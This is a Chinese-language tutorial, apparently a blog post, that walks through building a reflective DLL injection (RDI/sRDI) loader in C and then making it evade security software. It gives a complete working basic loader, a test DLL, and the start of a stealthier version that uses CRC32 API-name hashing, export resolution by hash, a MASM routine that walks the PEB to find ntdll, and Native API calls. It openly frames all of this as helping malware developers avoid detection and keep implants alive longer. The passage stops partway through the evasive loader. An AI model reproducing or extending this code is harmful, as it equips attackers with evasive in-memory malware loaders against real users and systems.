在本文中，我将向读者展示如何使用C语言编写自己的RDI / sRDI加载器，然后展示如何优化代码使其完全位置无关。

作为安全研究员和恶意软件开发人员,能够使用RDI /
sRDI等技术创建自己的加载程序可以帮助避免安全软件的检测,并增加给定恶意软件变体的寿命。植入程序越独特,安全软件检测和分析就越困难,从而使其在其预期用途上更加有效。学习如何使用RDI
/ sRDI加载等技术编写自己的加载程序是保持竞争优势的关键因素。

**TL;DR**  
最终的代码示例已添加到我的仓库中,但是如果您正在学习,我强烈建议您在进行操作时重新输入所有内容以获得最大的收益。  
<https://github.com/maliciousgroup/RDI-SRDI?ref=blog.malicious.group>  
话虽如此,让我们看一下跟随本文所需的先决条件。  
先决条件  
反射式DLL注入(RDI)和Shellcode反射式DLL注入(sRDI)是攻击者用于将DLL或shellcode加载到进程中的技术,该技术不需要传统的注入方法。
RDI由Stephen Fewer于2009年引入,而sRDI由Adam
Chester在2016年的DerbyCon会议上介绍。这两位研究人员都因向公众介绍这些技术而受到赞誉。  
要完全掌握本文中的示例,必须对PE文件格式及其在Windows中的典型加载方式有深入的了解。  
以下列表概述了Windows加载PE文件时采取的几个关键步骤。这些也是我们编写RDI加载器时需要采取的相同步骤。  
1.在此步骤中,从文件系统或内存读取DLL文件的二进制表示形式。这通常涉及打开文件,读取其内容并将二进制数据存储在内存中以进行进一步处理。  
2.解析DLL文件的PE头以提取重要信息,例如映像大小。 PE头是位于DLL文件开头的数据结构,其中包含有关文件的组织和布局的信息,包括不同节的大小。  
3.在此步骤中,在目标进程的地址空间中分配内存以容纳DLL的二进制数据。这通常使用VirtualAllocEx函数完成,该函数保留并提交具有适当大小以容纳整个DLL映像的内存块。然后使用PIMAGE_SECTION_HEADER结构进行迭代并将节复制到新分配的内存中。  
4.重定位(也称为修补)应用于DLL映像,以调整映像中代码和数据的地址以匹配映像在目标进程中加载的基地址。此步骤涉及迭代PE头中的重定位表,并对分配的内存中相应位置应用必要的地址调整。  
5.处理DLL的导入地址表(IAT)以解析和更新对外部函数和数据的导入引用。此步骤涉及迭代IAT并通过将所需模块加载到目标进程中,获取导入函数或数据的地址,并使用已解析的地址更新IAT来解析导入引用。  
6.将DLL映像中不同部分的保护设置应用于分配内存中相应的内存页面。这涉及使用VirtualProtectEx函数设置适当的内存保护标志,例如PAGE_EXECUTE_READWRITE用于可执行部分和PAGE_READWRITE用于可写部分。  
7.如果DLL具有线程局部存储(TLS)回调,则在目标进程中执行它们。 TLS是一种机制,允许进程中的每个线程都具有自己的线程特定数据存储。
TLS回调是在创建或终止线程时执行的函数,它们通常用于初始化或清理线程特定数据。  
8.最后,将执行权移交给DLL的入口点,即DllMain函数。
DllMain是DLL中的特殊函数,在加载或卸载DLL时操作系统会自动调用它,并负责执行特定于DLL的任何必要初始化或清理任务。  
为了确保彻底理解上述步骤,重点想象如何使用C代码执行每个任务。如果您还不确定或希望获得有关PE格式功能的更多知识,我强烈建议参加Xeno
Kovah的OST2[课程](https://www.youtube.com/playlist?list=PLUFkSN0XLZ-n_Na6jwqopTt1Ki57vMIc3&ref=blog.malicious.group "课程")或观看Dr. Josh
Stroschein在YouTube上发布的[视频](https://www.youtube.com/watch?v=3fzSUMlxVz0&ref=blog.malicious.group
"视频")。  
从现在开始,我还将假设读者具备了至少一些我将在以下部分中涵盖的主题方面的先前知识。

**构建设置**  
为了开发,我选择使用Jetbrains' CLion作为首选IDE。由于我之前购买了PyCharm
Professional,因此我已经拥有Jetbrains帐户,并发现CLion是这项任务的绝佳工具。  
在即将到来的构建过程中,我的第一步将涉及创建一个仅用于测试我们的RDI /
sRDI加载程序的通用DLL。成功创建DLL后,我将继续构建使用标准Windows
API执行测试DLL注入的基本RDI加载程序。最后,我将创建一个离散RDI /
sRDI加载程序,其中包括函数哈希、混淆函数指针,并且利用来自ntdll.dll 的Native API。  
为了清晰起见,我将把加载器代码分成不同的部分。我发现这是展示标准API与Native API下加载器工作方式最简单的方法。

**DLL创建**  
使用CLion作为IDE时,我的第一步将是创建一个新C项目,名称为dll_poc,如下例所示。

![](./img/1038990981391054559.png)  
创建dll_poc项目后,您应该看到以下图像,这将允许您开始编辑main.c文件。

![](./img/2996257939709868491.png)  
以下代码应该放入main.c中,以创建并导出DLL文件中的DllMain()函数。  
main.c

    
    
    #include <windows.h>
    
    #define DLLEXPORT   __declspec( dllexport )
    
    DLLEXPORT BOOL DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved);
    
    BOOL APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
        switch (ul_reason_for_call) {
            case DLL_PROCESS_ATTACH:
                MessageBoxA(NULL, "DLL PROCESS ATTACH", "Bingo!", 0);
                break;
            case DLL_THREAD_ATTACH:
            case DLL_THREAD_DETACH:
            case DLL_PROCESS_DETACH:
            default:
                break;
        }
        return TRUE;
    }
    

为了确保我们将其编译为DLL而不是EXE,我们需要修改位于项目根目录中的CMakeLists.txt文件。该文件应如下所示。  
CMakeLists.txt

    
    
    cmake_minimum_required(VERSION 3.24)
    project(dll_poc C)
    
    set(CMAKE_C_STANDARD 17)
    
    # add_executable(dll_poc main.c)
    set(CMAKE_SHARED_LIBRARY_PREFIX "")
    add_library(dll_poc SHARED main.c)

现在,两个上述文件都已修改,我们可以继续构建项目,这应该会在通用的cmake-debug-build目录中创建一个dll_poc.dll文件。

![](./img/879383009242257350.png)  
创建了dll_poc.dll文件后,我们可以通过使用rundll32快速测试DllMain函数是否正常工作而不出错。

![](./img/8981306900602177927.png)  
有了DLL,我将把DLL复制到C:/ Temp /以进行简单的测试。

    
    
    cp .\cmake-build-debug\dll_poc.dll C:\Temp\

**基本的RDI加载器**  
将编译后的DLL文件移动到C:/ Temp /后,就可以开始编写加载器了。因此,我将再次创建一个名为dll_loader的新C项目,如下所示。

![](./img/3566236919715151673.png)  
创建新项目后,在IDE中使用快捷键 Alt + F12打开终端,并创建以下文件夹。根据您在CLion中使用的命令解释器,来决定您将运行哪些命令。

**构造所需的文件夹**  
Powershell

    
    
    New-Item -ItemType Directory -Force -Path "src\c","src\h","src\masm"

Cmd

    
    
    mkdir src\c src\h src\masm
    

一旦设置了上述文件夹,IDE文件浏览器应如下所示。

![](./img/5273782350842730808.png)  
现在,已创建目录,可以使用以下命令将其中一些空文件填充到各自的目录中。

**构造所需的文件**  
Powershell

    
    
    New-Item -ItemType File -Path "src/c/peb.c", "src/h/peb.h", "src/masm/peb.masm"
    New-Item -ItemType File -Path "src/h/defs.h", "src/h/structs.h"

Cmd

    
    
    echo.>src\c\peb.c
    echo.>src\h\peb.h
    echo.>src\masm\peb.masm
    copy /b src\c\peb.c+,, src\h\peb.h+,, src\masm\peb.masm+,
    echo.>src\h\defs.h
    echo.>src\h\structs.h
    

运行上述命令以设置一些空文件后,您应该会看到下图所示的文件布局。

![](./img/2507367403534386042.png)  
创建了所有必要的文件存根之后,下一步是使用main.c创建基本DLL注入。现在,我们将使用来自ired.team的示例,其中使用我认为“高级”的Windows
API函数来确保逻辑可靠。确认后,我们可以继续开发和优化代码。

**基本-步骤1**  
在此步骤中,从文件中读取DLL文件的二进制表示形式...

    
    
    HANDLE dll = CreateFileA("\\??\\C:\\Temp\\dll_poc.dll", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
    DWORD64 dll_size = GetFileSize(dll, NULL);
    LPVOID dll_bytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dll_size);
    DWORD out_size = 0;
    ReadFile(dll, dll_bytes, dll_size, &out_size, NULL);
    

此代码使用CreateFileA函数打开要读取的DLL,然后使用HeapAlloc分配一些堆空间,该空间将存储ReadFile正在读取的文件。

**基本-步骤2**  
解析DLL文件的PE头以提取重要信息...

    
    
    PIMAGE_DOS_HEADER dos_headers = (PIMAGE_DOS_HEADER)dll_bytes;
    PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)((DWORD_PTR)dll_bytes + dos_headers->e_lfanew);
    SIZE_T dllImageSize = nt_headers->OptionalHeader.SizeOfImage;
    

此代码使用PIMAGE_DOS_HEADER和PIMAGE_NT_HEADERS结构查找DLL文件的大小,该大小存储在nt_headers->OptionalHeader.SizeOfImage成员变量中。

**基本-步骤3**  
在目标进程的地址空间中分配内存以容纳二进制文件...

    
    
    LPVOID dllBase = VirtualAlloc((LPVOID)ntHeaders->OptionalHeader.ImageBase, dllImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    DWORD_PTR deltaImageBase = (DWORD_PTR)dllBase - (DWORD_PTR)ntHeaders->OptionalHeader.ImageBase;
    memcpy(dllBase, dllBytes, ntHeaders->OptionalHeader.SizeOfHeaders);
    
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    for (size_t i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        LPVOID sectionDestination = (LPVOID)((DWORD_PTR)dll_base + (DWORD_PTR)section->VirtualAddress);
        LPVOID sectionBytes = (LPVOID)((DWORD_PTR)dll_bytes + (DWORD_PTR)section->PointerToRawData);
        memcpy(sectionDestination, sectionBytes, section->SizeOfRawData);
        section++;
    }
    

此代码负责将DLL的各个节从磁盘上的文件复制到先前为DLL分配的内存块中。它通过使用PIMAGE_SECTION_HEADER和IMAGE_FIRST_SECTION结构来迭代要复制到分配内存中的每个节来实现此目的。

**基本-步骤4**  
加载程序执行任何必要的重定位修复。重定位...

    
    
    IMAGE_DATA_DIRECTORY relocations = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    DWORD_PTR relocationTable = relocations.VirtualAddress + (DWORD_PTR)dll_base;
    DWORD relocationsProcessed = 0;
    
    while (relocationsProcessed < relocations.Size) {
        PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)(relocationTable + relocationsProcessed);
        relocationsProcessed += sizeof(BASE_RELOCATION_BLOCK);
        DWORD relocationsCount = (relocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
        PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)(relocationTable + relocationsProcessed);
    
        for (DWORD i = 0; i < relocationsCount; i++) {
            relocationsProcessed += sizeof(BASE_RELOCATION_ENTRY);
            if (relocationEntries[i].Type == 0) {
                continue;
            }
    
            DWORD_PTR relocationRVA = relocationBlock->PageAddress + relocationEntries[i].Offset;
            DWORD_PTR addressToPatch = 0;
            ReadProcessMemory(GetCurrentProcess(), (LPCVOID)((DWORD_PTR)dll_base + relocationRVA), &addressToPatch, sizeof(DWORD_PTR), NULL);
            addressToPatch += deltaImageBase;
            memcpy((PVOID)((DWORD_PTR)dll_base + relocationRVA), &addressToPatch, sizeof(DWORD_PTR));
        }
    }
    

此代码负责将DLL映像重新定位到其新基地址。它首先获取重定位数据目录并计算重定位表的RVA。然后,它使用PBASE_RELOCATION_ENTRY和PBASE_RELOCATION_BLOCK结构迭代重定位表中的每个块,并根据重定位类型和偏移量计算要修补的地址。它读取要修补地址处的原始值,将其加上增量映像基址,并将其写回同一位置以更新地址到新位置。该过程确保DLL可以在其新基地址上正确运行。

**基本-步骤5**  
加载程序执行任何必要的导入。导入是对函数的引用...

    
    
    PIMAGE_IMPORT_DESCRIPTOR importDescriptor = NULL;
    IMAGE_DATA_DIRECTORY importsDirectory = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(importsDirectory.VirtualAddress + (DWORD_PTR)dll_base);
    PCHAR libraryName = "";
    HMODULE library = NULL;
    
    while (importDescriptor->Name != 0) {
        libraryName = (PCHAR)importDescriptor->Name + (DWORD_PTR)dll_base;
        library = LoadLibraryA(libraryName);
    
        if (library) {
            PIMAGE_THUNK_DATA thunk = NULL;
            thunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)dll_base + importDescriptor->FirstThunk);
    
            while (thunk->u1.AddressOfData != 0) {
                if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal)) {
                    LPCSTR functionOrdinal = (LPCSTR)IMAGE_ORDINAL(thunk->u1.Ordinal);
                    thunk->u1.Function = (DWORD_PTR)GetProcAddress(library, functionOrdinal);
                }
                else {
                    PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)dll_base + thunk->u1.AddressOfData);
                    DWORD_PTR functionAddress = (DWORD_PTR)GetProcAddress(library, functionName->Name);
                    thunk->u1.Function = functionAddress;
                }
                ++thunk;
            }
        }
        importDescriptor++;
    }
    

此代码负责加载DLL的导入函数。它首先检索导入目录的地址,然后循环遍历每个导入描述符,通过其名称或序数值加载包含导入函数的库并解析每个导入函数。然后它在适当的thunk表项中设置每个导入函数的地址。

**基本-步骤6**  
最后,加载程序将控制权转移到可执行文件的入口点...

    
    
    DLLEntry DllEntry = (DLLEntry)((DWORD_PTR)dll_base + ntHeaders->OptionalHeader.AddressOfEntryPoint);
    (*DllEntry)((HINSTANCE)dll_base, DLL_PROCESS_ATTACH, 0);
    
    CloseHandle(dll);
    HeapFree(GetProcessHeap(), 0, dll_bytes);
    

此代码片段使用已加载DLL的OptionalHeader字段AddressOfEntryPoint获取DLL入口点的地址。然后,它将此地址转换为类型为DLLEntry的函数指针,该类型表示DLL的入口点。(*
DllEntry)语法取消引用函数指针并使用已加载DLL的HINSTANCE、DLL_PROCESS_ATTACH标志以及第三个参数的值0调用入口点函数。最后,代码释放为加载DLL分配的资源,包括关闭对文件的句柄和释放为存储DLL字节而分配的内存。  
基本-最后部分  
采取上述所有步骤并将其组合起来将如下所示。

    
    
    #include <windows.h>
    #include <stdio.h>
    
    typedef struct BASE_RELOCATION_BLOCK {
        DWORD PageAddress;
        DWORD BlockSize;
    } BASE_RELOCATION_BLOCK, *PBASE_RELOCATION_BLOCK;
    
    typedef struct BASE_RELOCATION_ENTRY {
        USHORT Offset : 12;
        USHORT Type : 4;
    } BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;
    
    typedef BOOL (WINAPI *DLLEntry)(HINSTANCE dll, DWORD reason, LPVOID reserved);
    
    int main() {
    
        HANDLE dll = CreateFileA("\\??\\C:\\Temp\\dll_poc.dll", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
        DWORD64 dll_size = GetFileSize(dll, NULL);
        LPVOID dll_bytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dll_size);
        DWORD out_size = 0;
        ReadFile(dll, dll_bytes, dll_size, &out_size, NULL);
    
        PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)dll_bytes;
        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)dll_bytes + dosHeaders->e_lfanew);
        SIZE_T dllImageSize = ntHeaders->OptionalHeader.SizeOfImage;
    
        LPVOID dll_base = VirtualAlloc((LPVOID)ntHeaders->OptionalHeader.ImageBase, dllImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        DWORD_PTR deltaImageBase = (DWORD_PTR)dll_base - (DWORD_PTR)ntHeaders->OptionalHeader.ImageBase;
        memcpy(dll_base, dll_bytes, ntHeaders->OptionalHeader.SizeOfHeaders);
    
        PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
        for (size_t i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
            LPVOID sectionDestination = (LPVOID)((DWORD_PTR)dll_base + (DWORD_PTR)section->VirtualAddress);
            LPVOID sectionBytes = (LPVOID)((DWORD_PTR)dll_bytes + (DWORD_PTR)section->PointerToRawData);
            memcpy(sectionDestination, sectionBytes, section->SizeOfRawData);
            section++;
        }
    
        IMAGE_DATA_DIRECTORY relocations = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        DWORD_PTR relocationTable = relocations.VirtualAddress + (DWORD_PTR)dll_base;
        DWORD relocationsProcessed = 0;
    
        while (relocationsProcessed < relocations.Size) {
            PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)(relocationTable + relocationsProcessed);
            relocationsProcessed += sizeof(BASE_RELOCATION_BLOCK);
            DWORD relocationsCount = (relocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
            PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)(relocationTable + relocationsProcessed);
    
            for (DWORD i = 0; i < relocationsCount; i++) {
                relocationsProcessed += sizeof(BASE_RELOCATION_ENTRY);
    
                if (relocationEntries[i].Type == 0) {
                    continue;
                }
    
                DWORD_PTR relocationRVA = relocationBlock->PageAddress + relocationEntries[i].Offset;
                DWORD_PTR addressToPatch = 0;
                ReadProcessMemory(GetCurrentProcess(), (LPCVOID)((DWORD_PTR)dll_base + relocationRVA), &addressToPatch, sizeof(DWORD_PTR), NULL);
                addressToPatch += deltaImageBase;
                memcpy((PVOID)((DWORD_PTR)dll_base + relocationRVA), &addressToPatch, sizeof(DWORD_PTR));
            }
        }
    
        PIMAGE_IMPORT_DESCRIPTOR importDescriptor = NULL;
        IMAGE_DATA_DIRECTORY importsDirectory = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
        importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(importsDirectory.VirtualAddress + (DWORD_PTR)dll_base);
        PCHAR libraryName = "";
        HMODULE library = NULL;
    
        while (importDescriptor->Name != 0) {
            libraryName = (PCHAR)importDescriptor->Name + (DWORD_PTR)dll_base;
            library = LoadLibraryA(libraryName);
    
            if (library) {
                PIMAGE_THUNK_DATA thunk = NULL;
                thunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)dll_base + importDescriptor->FirstThunk);
    
                while (thunk->u1.AddressOfData != 0) {
                    if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal)) {
                        LPCSTR functionOrdinal = (LPCSTR)IMAGE_ORDINAL(thunk->u1.Ordinal);
                        thunk->u1.Function = (DWORD_PTR)GetProcAddress(library, functionOrdinal);
                    }
                    else {
                        PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)dll_base + thunk->u1.AddressOfData);
                        DWORD_PTR functionAddress = (DWORD_PTR)GetProcAddress(library, functionName->Name);
                        thunk->u1.Function = functionAddress;
                    }
                    ++thunk;
                }
            }
            importDescriptor++;
        }
    
        DLLEntry DllEntry = (DLLEntry)((DWORD_PTR)dll_base + ntHeaders->OptionalHeader.AddressOfEntryPoint);
        (*DllEntry)((HINSTANCE)dll_base, DLL_PROCESS_ATTACH, 0);
    
        CloseHandle(dll);
        HeapFree(GetProcessHeap(), 0, dll_bytes);
    
        return 0;
    
    }
    

在main.c中键入代码后,构建解决方案并运行可执行文件。这应该与项目创建时附带的默认CMakeLists.txt一起工作。

![](./img/4181368200933011346.png)  
正如您在上面看到的那样,此示例有效。但是,这是一个非常基本的RDI注入示例,没有任何优化或混淆,并且在大多数安全环境中都不起作用。看看原因,让我们仔细研究一下二进制文件。  
首先让我们运行二进制文件,并在不点击“Ok”按钮关闭它时打开Process Hacker并查看内存。

![](./img/1736257791176412415.png)

正如您在上面的图像中看到的那样,我们当前在内存中有一个RWX区域,这是一个明显提示某些可疑事件正在发生。我们需要确保修复这个问题以及即将推出版本中的其他所有内容。  
接下来,让我们使用CFF Explorer打开文件,如下所示。

![](./img/859847274110136029.png)  
在这里,您可以看到dll_loader.exe文件正在导入带有24个函数的KERNEL32.dll和带有26个函数的msvcrt.dll。您可能会问自己为什么有50个导入函数,而代码本身只使用其中一小部分？这是因为msvcrt.dll和更高级别的Windows
API函数也使用底层函数。  
最后,让我们使用Sys Internals工具中的strings.exe查看二进制文件。

    
    
    C:\Temp>strings.exe C:\Maldev\evasion\dll_loader\cmake-build-debug\dll_loader.exe | find /c /v ""
    1490
    

在strings.exe输出中有1490个条目,并且以下是我们想要删除的某些项目示例。

![](./img/2903881570316815834.png)  
上面输出中所有使用的函数都可以以明文形式轻松查看。这对于任何恶意软件开发人员来说都是一个问题,并且需要处理以使此加载器更隐蔽。  
正如您在上面的示例中看到的那样,基本加载器产生了大量信息,还需要大量工作。现在让我们看看编写使用Windows Native
API、混淆函数指针、函数名称哈希等方式进行混淆处理RDI注入。

**隐蔽加载器**  
在此版本的加载器中,我们将利用先前生成的文件来存储自定义结构、函数定义和汇编代码以提高RDI加载器的隐蔽性。
使用相同的dll_loader项目,暂时注释掉当前main()函数,以便我们可以从头开始重新编写所有内容。
首先,我们需要创建一些辅助函数来进行函数哈希和函数地址解析。为此,我们将从peb.c文件中合并CRC哈希函数,并添加一个get_proc_address_by_hash函数,该函数根据提供的DLL解析函数地址。

**辅助函数**  
peb.c

    
    
    #include "peb.h"
    #include <stdint.h>
    
    uint32_t crc32b(const uint8_t *str) {
        uint32_t crc = 0xFFFFFFFF;
        uint32_t byte;
        uint32_t mask;
        int i = 0x0;
        int j;
    
        while (str[i] != 0) {
            byte = str[i];
            crc = crc ^ byte;
            for (j = 7; j >= 0; j--) {
                mask = -1 * (crc & 1);
                crc = (crc >> 1) ^ (SEED & mask);
            }
            i++;
        }
        return ~crc;
    }
    
    void *get_proc_address_by_hash(void *dll_address, uint32_t function_hash) {
        void *base = dll_address;
        PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)base;
        PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)((DWORD_PTR)base + dos_header->e_lfanew);
        PIMAGE_EXPORT_DIRECTORY export_directory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)base + nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
        unsigned long *p_address_of_functions = (PDWORD)((DWORD_PTR)base + export_directory->AddressOfFunctions);
        unsigned long *p_address_of_names = (PDWORD)((DWORD_PTR)base + export_directory->AddressOfNames);
        unsigned short *p_address_of_name_ordinals = (PWORD)((DWORD_PTR)base + export_directory->AddressOfNameOrdinals);
    
        for(unsigned long i = 0; i < export_directory->NumberOfNames; i++) {
            LPCSTR p_function_name = (LPCSTR)((DWORD_PTR)base + p_address_of_names[i]);
            unsigned short p_function_ordinal = (unsigned short)p_address_of_name_ordinals[i];
            unsigned long p_function_address = (unsigned long)p_address_of_functions[p_function_ordinal];
    
            if(function_hash == HASH(p_function_name))
                return (void *)((DWORD_PTR)base + p_function_address);
        }
        return NULL;
    }
    

如上所示的代码中,crc32b函数接受一个字符串并返回用于存储的哈希值,get_proc_address_by_hash函数接受DLL的基地址和散列函数名称作为输入,并返回函数地址。我们还添加了peb.h头文件,其中包括crc32b所需的变量,如下所示。  
peb.h

    
    
    #include <stdint.h>
    #include "defs.h"
    
    #define SEED 0xDEADDEAD
    #define HASH(API)(crc32b((uint8_t *)API))
    
    uint32_t crc32b(const uint8_t *str);
    
    void *get_proc_address_by_hash(void *dll_address, uint32_t function_hash);
    

接下来,我们将把旧的main.c中的结构移动到structs.h头文件中,如下所示。  
structs.h

    
    
    #include <windows.h>
    
    typedef struct BASE_RELOCATION_BLOCK {
        DWORD PageAddress;
        DWORD BlockSize;
    } BASE_RELOCATION_BLOCK, *PBASE_RELOCATION_BLOCK;
    
    typedef struct BASE_RELOCATION_ENTRY {
        USHORT Offset : 12;
        USHORT Type : 4;
    } BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;
    

接下来,我们将向defs.h文件添加一些内容以定义一些常量。随着我们进一步进行,这也是我们所有函数定义的位置。  
defs.h

    
    
    #include "structs.h"
    
    #define NtCurrentThread() ( (HANDLE)(LONG_PTR) -2 )
    #define NtCurrentProcess() ( (HANDLE)(LONG_PTR) -1 )
    #define RTL_CONSTANT_STRING(s) { sizeof(s)-sizeof((s)[0]), sizeof(s), s }
    #define FILL_STRING(string, buffer)       \
        string.Length = (USHORT)strlen(buffer);   \
        string.MaximumLength = string.Length; \
        string.Buffer = buffer
    

现在是时候熟悉一些基本的MASM汇编指令了。由于我们将Native
API用于我们的加载器,因此必须知道如何获取ntdll.dll库的地址以在需要时解析Native
API函数。虽然这项任务也可以在C语言中完成,但学习汇编语言可以帮助编写C代码,这就是我们将重点关注它的原因。  
peb.masm

    
    
    .CODE
    
    get_ntdll PROC
        xor     rax, rax
        mov     rax, gs:[60h]
        mov     rax, [rax + 18h]
        mov     rax, [rax + 20h]
        mov     rax, [rax]
        mov     rax, [rax + 20h]
        ret
    get_ntdll ENDP
    
    END

上面的代码正在遍历当前64位进程的PEB(进程环境块)以查找ntdll.dll的地址。这是因为ntdll.dll DLL在所有进程中具有相同的基地址。
以下是上述代码中发生的步骤解释说明内容。  
1.xor rax,rax:这将rax寄存器的值设置为零,这是在使用寄存器之前初始化寄存器的常见方法。  
2.mov
rax,gs:[60h]:这从gs段寄存器中检索PEB的地址,gs段寄存器是Windows用于线程本地存储的寄存器。偏移量60h是TIB(线程信息块)中PEB指针的位置,TIB是Windows用于存储有关线程的信息的另一个数据结构。  
3.mov rax,[rax + 18h]:这检索PEB的Ldr(Loader)成员的地址,它是指向已加载模块链表的指针。  
4.mov rax,[rax + 20h]:这检索链接列表中的第一个条目的地址,该条目对应于进程的主模块(即可执行文件本身)。  
5.mov rax,[rax]:这检索主模块的基地址。  
6.mov rax,[rax + 20h]:这检索链接列表中的第二个条目的地址,该条目对应于ntdll.dll。  
7.ret:这返回rax的值,现在它包含ntdll.dll的基地址。  
32位应用程序的指令略有不同,但由于我正在使用64位,因此将使用以上版本。  
使用peb.masm创建get_ntdll()函数后,我们需要向peb.h文件添加一行以导出get_ntdll()函数以供使用。  
peb.h

    
    
    #include <stdint.h>
    #include "defs.h"
    
    #define SEED 0xDEADDEAD
    #define HASH(API)(crc32b((uint8_t *)API))
    
    extern void *get_ntdll();
    
    uint32_t crc32b(const uint8_t *str);
    
    void *get_proc_address_by_hash(void *dll_address, uint32_t function_hash);
    

如上所示,我们添加了第7行以便从我们的C代码中访问get_ntdll()MASM函数。建了上述辅助函数后,在继续之前要做的最后一件事是设置CMakeLists.txt配置以设置MASM编译以及其他使事情更容易的特性。

CMakeLists.txt

    
    
    cmake_minimum_required(VERSION 3.24)
    project(dll_loader C)
    
    set(CMAKE_C_STANDARD 17)
    set(MASM_NAMES src/masm/peb)
    
    include_directories(${CMAKE_SOURCE_DIR}/src/h)
    
    FOREACH(src ${MASM_NAMES})
        SET(MASM_SRC ${CMAKE_CURRENT_SOURCE_DIR}/${src}.masm)
        SET(MASM_OBJ ${CMAKE_CURRENT_BINARY_DIR}/${src}.obj)
        ADD_CUSTOM_COMMAND(
                OUTPUT ${MASM_OBJ}
                COMMAND C:/Temp/ml64.exe /c /Fo${MASM_OBJ} ${MASM_SRC}
                DEPENDS ${MASM_SRC}
                COMMENT "Assembling ${MASM_SRC}")
        SET(MASM_OBJECTS ${MASM_OBJECTS} ${MASM_OBJ})
    ENDFOREACH(src)
    
    add_executable(dll_loader ${MASM_OBJECTS} main.c src/c/peb.c)

在上述配置中,它将允许我们添加我们的MASM文件以编译并用作C编译过程的一部分。它还允许项目中的每个文件仅按名称添加头文件,而无需添加每个路径。您会注意到我将ml64.exe二进制文件移动到C:/
Temp /目录以进行测试,因此您可以执行相同操作或在类似Visual Studio之类的地方使用ml64.exe存在的完整路径。
现在Cmake配置完成了,我们可以转到main.c文件以开始编写和设置在main.c中需要的新功能和结构。
在main.c中,我们将使用基本加载器中每个步骤中的逻辑,并将其重写为Native API函数,并使用函数指针混淆。

    
    
    HANDLE dll = CreateFileA("\\??\\C:\\Temp\\dll_poc.dll", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
     DWORD64 dll_size = GetFileSize(dll, NULL);
     LPVOID dll_bytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dll_size);
     DWORD out_size = 0;
     ReadFile(dll, dll_bytes, dll_size, &out_size, NULL);
    

上面的代码是我们基本加载器中的第1步,该代码基本上只是以读取模式打开文件,在分配内存以存储数据之前读取文件大小,并通过ReadFile函数读取到分配的内存中。

要使用Native API重写这些函数,重要的是清楚地了解需要哪些函数以及如何为每个函数设置函数名称哈希和函数定义。以下函数需要替换上面第1步代码中的函数。  
1.RtlInitUnicodeString-需要创建Unicode字符串  
2.NtCreateFile-需要替换CreateFileA  
3.NtQueryInformationFile-需要获取有关文件的信息  
4.NtAllocateVirtualMemory-需要为文件分配内存  
5.NtReadFile-需要读取文件内容  
为了使这些函数起作用,我们将需要向structs.h头文件添加一些新结构。这是因为Native API调用依赖于需要添加的较低层级数据结构。  
1.UNICODE_STRING  
2.OBJECT_ATTRIBUTES  
3.IO_STATUS_BLOCK  
4.FILE_STANDARD_INFORMATION  
5.PIO_APC_ROUTINE  
由于这是恶意软件开发中的常见主题,我将向您展示我用来获取两个结构和函数定义以及如何哈希名称的定义来源。

我经常参考x64dbg项目中使用的ntdll.dll头文件作为参考点。我认为不必在我的项目中包含整个文件,而是重要的是了解哪些函数使用哪些结构。通过仅添加必要组件,可以减小项目大小并潜在地减少分析范围。这种方法还允许更好地理解正在使用的函数并提供更专注和流畅的开发过程。
解决函数定义的第一件事是从上面链接中列出的ntdll.dll头文件中提取函数原型。提取函数原型后,我将其复制如下所示defs.h文件中。  
defs.h

    
    
    #include "structs.h"
    
    #define NtCurrentThread() ( (HANDLE)(LONG_PTR) -2 )
    #define NtCurrentProcess() ( (HANDLE)(LONG_PTR) -1 )
    #define RTL_CONSTANT_STRING(s) { sizeof(s)-sizeof((s)[0]), sizeof(s), s }
